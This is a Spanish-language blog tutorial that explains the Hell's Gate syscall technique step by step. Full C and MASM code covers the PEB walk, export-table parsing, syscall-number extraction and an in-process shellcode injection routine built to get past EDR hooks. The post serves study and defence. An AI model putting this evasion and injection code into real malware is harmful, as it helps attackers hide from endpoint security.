---
layout: single
title: "Hell's Gate por dentro: PEB walk, EAT parsing y pseudo-desensamblado sin Win32 API"
date: 2026-06-17
categories: [tutoriales, malware]
tags: [windows-internals, syscalls, hells-gate, peb, eat, ntdll, evasion, edr, masm, position-independent]
excerpt: "Análisis de la implementación original de Hell's Gate (am0nsec y smelly__vx): cómo obtener el base de ntdll desde el PEB, traversar el EAT sin llamar a ninguna función Win32, extraer el SSN por pseudo-desensamblado y ejecutar la syscall con un stub MASM de dos funciones."
permalink: /tutoriales/hells-gate-implementacion/
---

Hell's Gate es una técnica publicada por am0nsec (@am0nsec) y smelly__vx (@RtlMateusz) que resuelve el problema de invocar syscalls de Windows sin depender de valores hardcodeados ni de funciones de la Win32 API. El paper original describe un framework de uso general que se autodetermina los SSNs en tiempo de ejecución, con posición independiente, sin realizar ninguna invocación de función para construir su propia tabla de syscalls.

Este post sigue el paper código a código. Para contexto sobre por qué los stubs de `ntdll.dll` importan, ver [post anterior sobre direct syscalls](/tutoriales/direct-syscalls-hells-gate/).

## El problema que resuelve

Antes de Hell's Gate, la aproximación estándar al evadir hooks de EDR era doble:

**IAT nulling**: recrear `LoadLibrary`, `GetProcAddress` y `FreeLibrary` manualmente para ocultar imports del PE. Técnica vigente desde los años 90, documentada en la ezine 29a.

**SysWhispers** (Jackson T., 2019): genera stubs con los SSNs correctos por versión de Windows — elimina la dependencia de ntdll para la ejecución, pero mantiene una tabla de valores estáticos en el binario. Esta tabla es una firma que los EDRs y herramientas de hunting detectan.

Hell's Gate elimina la tabla estática. En su lugar, lee el SSN directamente de los bytes de ntdll en memoria en tiempo de ejecución — sin llamar a ninguna función Win32 para lograrlo.

## Acceso al PEB sin llamadas a la API

El punto de entrada es el *Process Environment Block* (PEB), una estructura asignada por el kernel a cada proceso en user-mode. En x64, la dirección del TEB (Thread Environment Block) está en el registro GS, y el PEB está dentro del TEB:

```c
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}
```

Con el puntero al PEB, se accede al miembro `LoaderData` → `InMemoryOrderModuleList`. Esta lista enlazada contiene todos los módulos cargados en el proceso. El primero es el propio PE; el segundo es siempre `ntdll.dll` (salvo que algún AV lo haya alterado, en cuyo caso la técnica falla antes de empezar):

```c
PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(
    (PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10
);
```

La resta de `0x10` (16 bytes) es el ajuste de alineación necesario para obtener el puntero a `LDR_DATA_TABLE_ENTRY` correctamente desde el `LIST_ENTRY` interno.

Con `pLdrDataEntry->DllBase` se tiene la dirección base de ntdll en memoria. Sin haber llamado a `LoadLibrary`, `GetModuleHandle`, ni ninguna función Win32.

## Traversal del EAT

Una vez con la base de ntdll, la implementación recorre la *Export Address Table* (EAT) del PE para localizar las funciones `Nt*`. El proceso sigue la cadena de cabeceras PE:

```
IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS
→ OptionalHeader.DataDirectory[0] → IMAGE_EXPORT_DIRECTORY
```

```c
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)(
        (PBYTE)pModuleBase + pImageDosHeader->e_lfanew
    );
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress
    );
    return TRUE;
}
```

El `IMAGE_EXPORT_DIRECTORY` expone tres arrays:
- `AddressOfNames`: nombres de las funciones exportadas
- `AddressOfNameOrdinals`: índice en `AddressOfFunctions` para cada nombre
- `AddressOfFunctions`: direcciones reales de las funciones

## Hash djb2 para evitar comparaciones de strings

Para identificar las funciones objetivo sin comparar strings directamente (lo que dejaría referencias de texto en el binario), el paper usa hashing djb2 sobre los nombres de la EAT:

```c
DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    while (c = *str++)
        dwHash = ((dwHash << 5) + dwHash) + c;
    return dwHash;
}
```

Los hashes de las funciones que necesita el payload se calculan una vez offline y se incluyen directamente:

```c
Table.NtAllocateVirtualMemory.dwHash  = 0xf5bd373480a6b89b;
Table.NtCreateThreadEx.dwHash         = 0x64dc7db288c5015f;
Table.NtProtectVirtualMemory.dwHash   = 0x858bcb1046fb6a37;
Table.NtWaitForSingleObject.dwHash    = 0xc6a2fa174e551bcb;
```

## Pseudo-desensamblado: extraer el SSN sin desensamblador

Con la dirección de la función en memoria, el paper "pseudo-desensambla" los primeros bytes del stub para extraer el SSN. En un stub de ntdll sin hooks, el byte en offset `+3` es `0xb8` — el opcode de `MOV EAX`:

```text
offset +0: 4C 8B D1    mov r10, rcx
offset +3: B8          ; opcode MOV EAX
offset +4: XX          ; low byte del SSN
offset +5: XX          ; high byte del SSN
offset +6: 00
offset +7: 00
```

El SSN está en los dos bytes siguientes al opcode, en little-endian. La extracción:

```c
if (*((PBYTE)pFunctionAddress + 3) == 0xb8) {
    BYTE high = *((PBYTE)pFunctionAddress + 5);
    BYTE low  = *((PBYTE)pFunctionAddress + 4);
    pVxTableEntry->wSystemCall = (high << 8) | low;
}
```

Verificación desde WinDbg — `NtCreateMutant` (SSN `0x00b3`):

```text
0:000> db (ntdll!NtCreateMutant + 0x4) L 2
00007fff`b040c3d4  b3 00                            ..
0:000> ? (0x00 << 8) | 0xb3
Evaluate expression: 179 = 00000000`000000b3
```

`NtPlugPlayControl` (SSN `0x0132`):

```text
0:000> db (ntdll!NtPlugPlayControl + 0x4) L 2
00007fff`b040d3b4  32 01                            2.
0:000> ? (0x01 << 8) | 0x32
Evaluate expression: 306 = 00000000`00000132
```

## Las estructuras VX_TABLE

El paper organiza los SSNs resueltos en una estructura simple:

```c
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;
```

`GetVxTableEntry` reúne todo: recorre la EAT, compara por hash, y si el byte `+3` es `0xb8` extrae el SSN:

```c
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
                     PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions    = (PDWORD)((PBYTE)pModuleBase +
                                      pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames        = (PDWORD)((PBYTE)pModuleBase +
                                      pImageExportDirectory->AddressOfNames);
    PWORD  pwAddressOfNameOrdinals  = (PWORD)((PBYTE)pModuleBase +
                                      pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR  pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID  pFunctionAddress = (PBYTE)pModuleBase +
                                   pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];

        if (djb2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            if (*((PBYTE)pFunctionAddress + 3) == 0xb8) {
                BYTE high = *((PBYTE)pFunctionAddress + 5);
                BYTE low  = *((PBYTE)pFunctionAddress + 4);
                pVxTableEntry->wSystemCall = (high << 8) | low;
            }
            break;
        }
    }
    return TRUE;
}
```

## Los stubs MASM: HellsGate y HellDescent

La ejecución de la syscall se delega a dos funciones MASM. El diseño separa el setter del SSN del ejecutor:

```nasm
.data
    wSystemCall DWORD 000h

.code
    HellsGate PROC
        mov wSystemCall, 000h   ; resetear
        mov wSystemCall, ecx    ; cargar SSN (primer argumento)
        ret
    HellsGate ENDP

    HellDescent PROC
        mov r10, rcx            ; convención syscall x64
        mov eax, wSystemCall    ; SSN cargado por HellsGate
        syscall
        ret
    HellDescent ENDP
End
```

`HellsGate(SSN)` actualiza el DWORD global. `HellDescent(args...)` ejecuta la syscall usando ese valor. El uso desde C:

```c
WORD syscall = 0x00b3;
HellsGate(syscall);

HANDLE hMutant = INVALID_HANDLE_VALUE;
NTSTATUS st = HellDescent(&hMutant, MUTANT_ALL_ACCESS, NULL, TRUE);
```

## Payload completo: shellcode injection in-process

El paper demuestra el framework con una inyección de shellcode en el proceso actual:

```c
BOOL Payload(PVX_TABLE pVxTable) {
    NTSTATUS status  = 0x00000000;
    char shellcode[] = "\x90\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3"; // NOPs + INT3 + ret

    // 1. Allocar memoria RW
    PVOID  lpAddress  = NULL;
    SIZE_T sDataSize  = sizeof(shellcode);
    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    // 2. Escribir shellcode (VxMoveMemory = memcpy custom, sin imports)
    VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

    // 3. Cambiar permisos a RX
    ULONG ulOldProtect = NULL;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize,
                         PAGE_EXECUTE_READ, &ulOldProtect);

    // 4. Crear thread
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1,
                         (LPTHREAD_START_ROUTINE)lpAddress,
                         NULL, FALSE, NULL, NULL, NULL, NULL);

    // 5. Esperar
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hHostThread, FALSE, &Timeout);

    return TRUE;
}
```

Ninguna de estas llamadas pasa por los stubs hooked de ntdll. Los SSNs se resolvieron desde la EAT, la instrucción `syscall` se ejecuta directamente desde los stubs MASM del binario.

## Limitación: stubs hooked

Hell's Gate asume que el byte `+3` del stub es `0xb8`. Si un EDR ha hooked la función, ese byte es parte de un JMP — la comprobación falla y el SSN no se extrae. La implementación del paper valida Windows 10 específicamente (`OSMajorVersion == 0xa`) y no maneja el caso de stubs parcheados.

Esa limitación es exactamente lo que Halo's Gate resuelve: cuando el stub está hooked, busca vecinos en la EAT ordenados por dirección y calcula el SSN por su posición relativa (los SSNs son secuenciales). El paper de Hell's Gate lo reconoce implícitamente al ser anterior a la proliferación de EDRs que hookean agresivamente ntdll.

## Conclusión

El valor del paper de am0nsec y smelly no es solo la técnica — es el diseño: **zero function invocations** para resolver syscalls. No se llama a `GetProcAddress`, no se usa ningún import para encontrar ntdll, no hay tabla de SSNs por versión de Windows. Todo se obtiene leyendo estructuras en memoria (`PEB → LDR_DATA → EAT`) y pseudo-desensamblando los stubs.

El patrón `HellsGate(SSN) + HellDescent(args)` ha influido en prácticamente todo el tooling ofensivo posterior que toca syscalls — desde Halo's Gate hasta implementaciones de C2 modernos. Entender cómo funciona el original es el punto de partida para entender sus sucesores.

**Referencia**: Hell's Gate — am0nsec (@am0nsec) y smelly__vx (@RtlMateusz), 2021.
